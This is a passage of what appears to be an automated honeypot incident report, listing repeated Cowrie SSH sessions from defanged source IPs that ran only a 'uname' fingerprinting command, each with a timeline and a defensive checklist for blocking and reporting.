- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1eee32e9ad5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:29` | `cowrie.session.connect` |
| `2026-08-16 18:51:29` | `cowrie.client.version` |
| `2026-08-16 18:51:29` | `cowrie.client.kex` |
| `2026-08-16 18:51:29` | `cowrie.login.success` |
| `2026-08-16 18:51:30` | `cowrie.session.params` |
| `2026-08-16 18:51:30` | `cowrie.command.input` |
| `2026-08-16 18:51:30` | `cowrie.log.closed` |
| `2026-08-16 18:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0d77acbc65

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:34` | `cowrie.session.connect` |
| `2026-08-16 18:51:34` | `cowrie.client.version` |
| `2026-08-16 18:51:34` | `cowrie.client.kex` |
| `2026-08-16 18:51:35` | `cowrie.login.success` |
| `2026-08-16 18:51:35` | `cowrie.session.params` |
| `2026-08-16 18:51:35` | `cowrie.command.input` |
| `2026-08-16 18:51:36` | `cowrie.log.closed` |
| `2026-08-16 18:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984ffc2aab58

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:40` | `cowrie.session.connect` |
| `2026-08-16 18:51:40` | `cowrie.client.version` |
| `2026-08-16 18:51:40` | `cowrie.client.kex` |
| `2026-08-16 18:51:40` | `cowrie.login.success` |
| `2026-08-16 18:51:41` | `cowrie.session.params` |
| `2026-08-16 18:51:41` | `cowrie.command.input` |
| `2026-08-16 18:51:41` | `cowrie.log.closed` |
| `2026-08-16 18:51:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a060243537a2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:45` | `cowrie.session.connect` |
| `2026-08-16 18:51:45` | `cowrie.client.version` |
| `2026-08-16 18:51:45` | `cowrie.client.kex` |
| `2026-08-16 18:51:46` | `cowrie.login.success` |
| `2026-08-16 18:51:47` | `cowrie.session.params` |
| `2026-08-16 18:51:47` | `cowrie.command.input` |
| `2026-08-16 18:51:47` | `cowrie.log.closed` |
| `2026-08-16 18:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76503ca4e79e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:51` | `cowrie.session.connect` |
| `2026-08-16 18:51:51` | `cowrie.client.version` |
| `2026-08-16 18:51:51` | `cowrie.client.kex` |
| `2026-08-16 18:51:51` | `cowrie.login.success` |
| `2026-08-16 18:51:52` | `cowrie.session.params` |
| `2026-08-16 18:51:52` | `cowrie.command.input` |
| `2026-08-16 18:51:52` | `cowrie.log.closed` |
| `2026-08-16 18:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-832e47615f68

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:56` | `cowrie.session.connect` |
| `2026-08-16 18:51:56` | `cowrie.client.version` |
| `2026-08-16 18:51:56` | `cowrie.client.kex` |
| `2026-08-16 18:51:57` | `cowrie.login.success` |
| `2026-08-16 18:51:58` | `cowrie.session.params` |
| `2026-08-16 18:51:58` | `cowrie.command.input` |
| `2026-08-16 18:51:58` | `cowrie.log.closed` |
| `2026-08-16 18:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fec13197d91

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:02` | `cowrie.session.connect` |
| `2026-08-16 18:52:02` | `cowrie.client.version` |
| `2026-08-16 18:52:02` | `cowrie.client.kex` |
| `2026-08-16 18:52:02` | `cowrie.login.success` |
| `2026-08-16 18:52:03` | `cowrie.session.params` |
| `2026-08-16 18:52:03` | `cowrie.command.input` |
| `2026-08-16 18:52:03` | `cowrie.log.closed` |
| `2026-08-16 18:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f242eebeae7c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:07` | `cowrie.session.connect` |
| `2026-08-16 18:52:07` | `cowrie.client.version` |
| `2026-08-16 18:52:07` | `cowrie.client.kex` |
| `2026-08-16 18:52:08` | `cowrie.login.success` |
| `2026-08-16 18:52:08` | `cowrie.session.params` |
| `2026-08-16 18:52:08` | `cowrie.command.input` |
| `2026-08-16 18:52:08` | `cowrie.log.closed` |
| `2026-08-16 18:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bcd3e6cfb6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:13` | `cowrie.session.connect` |
| `2026-08-16 18:52:13` | `cowrie.client.version` |
| `2026-08-16 18:52:13` | `cowrie.client.kex` |
| `2026-08-16 18:52:13` | `cowrie.login.success` |
| `2026-08-16 18:52:14` | `cowrie.session.params` |
| `2026-08-16 18:52:14` | `cowrie.command.input` |
| `2026-08-16 18:52:14` | `cowrie.log.closed` |
| `2026-08-16 18:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c6df3222a0a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:18` | `cowrie.session.connect` |
| `2026-08-16 18:52:18` | `cowrie.client.version` |
| `2026-08-16 18:52:18` | `cowrie.client.kex` |
| `2026-08-16 18:52:18` | `cowrie.login.success` |
| `2026-08-16 18:52:19` | `cowrie.session.params` |
| `2026-08-16 18:52:19` | `cowrie.command.input` |
| `2026-08-16 18:52:19` | `cowrie.log.closed` |
| `2026-08-16 18:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d181dcc0880

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:23` | `cowrie.session.connect` |
| `2026-08-16 18:52:23` | `cowrie.client.version` |
| `2026-08-16 18:52:23` | `cowrie.client.kex` |
| `2026-08-16 18:52:23` | `cowrie.login.success` |
| `2026-08-16 18:52:24` | `cowrie.session.params` |
| `2026-08-16 18:52:24` | `cowrie.command.input` |
| `2026-08-16 18:52:24` | `cowrie.log.closed` |
| `2026-08-16 18:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2185907b37f8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:24` | `cowrie.session.connect` |
| `2026-08-16 18:52:24` | `cowrie.client.version` |
| `2026-08-16 18:52:24` | `cowrie.client.kex` |
| `2026-08-16 18:52:25` | `cowrie.login.success` |
| `2026-08-16 18:52:26` | `cowrie.session.params` |
| `2026-08-16 18:52:26` | `cowrie.command.input` |
| `2026-08-16 18:52:26` | `cowrie.log.closed` |
| `2026-08-16 18:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac5fa99ba70

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:29` | `cowrie.session.connect` |
| `2026-08-16 18:52:29` | `cowrie.client.version` |
| `2026-08-16 18:52:29` | `cowrie.client.kex` |
| `2026-08-16 18:52:29` | `cowrie.login.success` |
| `2026-08-16 18:52:30` | `cowrie.session.params` |
| `2026-08-16 18:52:30` | `cowrie.command.input` |
| `2026-08-16 18:52:30` | `cowrie.log.closed` |
| `2026-08-16 18:52:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e604a43c05

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:34` | `cowrie.session.connect` |
| `2026-08-16 18:52:34` | `cowrie.client.version` |
| `2026-08-16 18:52:34` | `cowrie.client.kex` |
| `2026-08-16 18:52:34` | `cowrie.login.success` |
| `2026-08-16 18:52:35` | `cowrie.session.params` |
| `2026-08-16 18:52:35` | `cowrie.command.input` |
| `2026-08-16 18:52:35` | `cowrie.log.closed` |
| `2026-08-16 18:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e997cfa29b9b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:39` | `cowrie.session.connect` |
| `2026-08-16 18:52:39` | `cowrie.client.version` |
| `2026-08-16 18:52:39` | `cowrie.client.kex` |
| `2026-08-16 18:52:40` | `cowrie.login.success` |
| `2026-08-16 18:52:41` | `cowrie.session.params` |
| `2026-08-16 18:52:41` | `cowrie.command.input` |
| `2026-08-16 18:52:41` | `cowrie.log.closed` |
| `2026-08-16 18:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137813bc57be

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:45` | `cowrie.session.connect` |
| `2026-08-16 18:52:45` | `cowrie.client.version` |
| `2026-08-16 18:52:45` | `cowrie.client.kex` |
| `2026-08-16 18:52:45` | `cowrie.login.success` |
| `2026-08-16 18:52:46` | `cowrie.session.params` |
| `2026-08-16 18:52:46` | `cowrie.command.input` |
| `2026-08-16 18:52:46` | `cowrie.log.closed` |
| `2026-08-16 18:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed83adea63d8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:50` | `cowrie.session.connect` |
| `2026-08-16 18:52:50` | `cowrie.client.version` |
| `2026-08-16 18:52:50` | `cowrie.client.kex` |
| `2026-08-16 18:52:51` | `cowrie.login.success` |
| `2026-08-16 18:52:52` | `cowrie.session.params` |
| `2026-08-16 18:52:52` | `cowrie.command.input` |
| `2026-08-16 18:52:52` | `cowrie.log.closed` |
| `2026-08-16 18:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790c3bf124b0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:52 |
| **Last Seen** | 2026-08-16 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:52:56` | `cowrie.session.connect` |
| `2026-08-16 18:52:56` | `cowrie.client.version` |
| `2026-08-16 18:52:56` | `cowrie.client.kex` |
| `2026-08-16 18:52:56` | `cowrie.login.success` |
| `2026-08-16 18:52:57` | `cowrie.session.params` |
| `2026-08-16 18:52:57` | `cowrie.command.input` |
| `2026-08-16 18:52:57` | `cowrie.log.closed` |
| `2026-08-16 18:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded9c099f06d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:01` | `cowrie.session.connect` |
| `2026-08-16 18:53:01` | `cowrie.client.version` |
| `2026-08-16 18:53:01` | `cowrie.client.kex` |
| `2026-08-16 18:53:02` | `cowrie.login.success` |
| `2026-08-16 18:53:02` | `cowrie.session.params` |
| `2026-08-16 18:53:02` | `cowrie.command.input` |
| `2026-08-16 18:53:02` | `cowrie.log.closed` |
| `2026-08-16 18:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5048a96e338d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:07` | `cowrie.session.connect` |
| `2026-08-16 18:53:07` | `cowrie.client.version` |
| `2026-08-16 18:53:07` | `cowrie.client.kex` |
| `2026-08-16 18:53:07` | `cowrie.login.success` |
| `2026-08-16 18:53:08` | `cowrie.session.params` |
| `2026-08-16 18:53:08` | `cowrie.command.input` |
| `2026-08-16 18:53:08` | `cowrie.log.closed` |
| `2026-08-16 18:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1a5b99795f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:12` | `cowrie.session.connect` |
| `2026-08-16 18:53:12` | `cowrie.client.version` |
| `2026-08-16 18:53:12` | `cowrie.client.kex` |
| `2026-08-16 18:53:12` | `cowrie.login.success` |
| `2026-08-16 18:53:13` | `cowrie.session.params` |
| `2026-08-16 18:53:13` | `cowrie.command.input` |
| `2026-08-16 18:53:13` | `cowrie.log.closed` |
| `2026-08-16 18:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52742cd72925

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:17` | `cowrie.session.connect` |
| `2026-08-16 18:53:17` | `cowrie.client.version` |
| `2026-08-16 18:53:17` | `cowrie.client.kex` |
| `2026-08-16 18:53:17` | `cowrie.login.success` |
| `2026-08-16 18:53:18` | `cowrie.session.params` |
| `2026-08-16 18:53:18` | `cowrie.command.input` |
| `2026-08-16 18:53:18` | `cowrie.log.closed` |
| `2026-08-16 18:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69923e01599

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:22` | `cowrie.session.connect` |
| `2026-08-16 18:53:22` | `cowrie.client.version` |
| `2026-08-16 18:53:23` | `cowrie.client.kex` |
| `2026-08-16 18:53:23` | `cowrie.login.success` |
| `2026-08-16 18:53:24` | `cowrie.session.params` |
| `2026-08-16 18:53:24` | `cowrie.command.input` |
| `2026-08-16 18:53:24` | `cowrie.log.closed` |
| `2026-08-16 18:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55102a290eb1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:28` | `cowrie.session.connect` |
| `2026-08-16 18:53:28` | `cowrie.client.version` |
| `2026-08-16 18:53:28` | `cowrie.client.kex` |
| `2026-08-16 18:53:28` | `cowrie.login.success` |
| `2026-08-16 18:53:29` | `cowrie.session.params` |
| `2026-08-16 18:53:29` | `cowrie.command.input` |
| `2026-08-16 18:53:29` | `cowrie.log.closed` |
| `2026-08-16 18:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118d395384bf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:33` | `cowrie.session.connect` |
| `2026-08-16 18:53:33` | `cowrie.client.version` |
| `2026-08-16 18:53:33` | `cowrie.client.kex` |
| `2026-08-16 18:53:33` | `cowrie.login.success` |
| `2026-08-16 18:53:34` | `cowrie.session.params` |
| `2026-08-16 18:53:34` | `cowrie.command.input` |
| `2026-08-16 18:53:34` | `cowrie.log.closed` |
| `2026-08-16 18:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1a32c2f318

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:38` | `cowrie.session.connect` |
| `2026-08-16 18:53:38` | `cowrie.client.version` |
| `2026-08-16 18:53:38` | `cowrie.client.kex` |
| `2026-08-16 18:53:39` | `cowrie.login.success` |
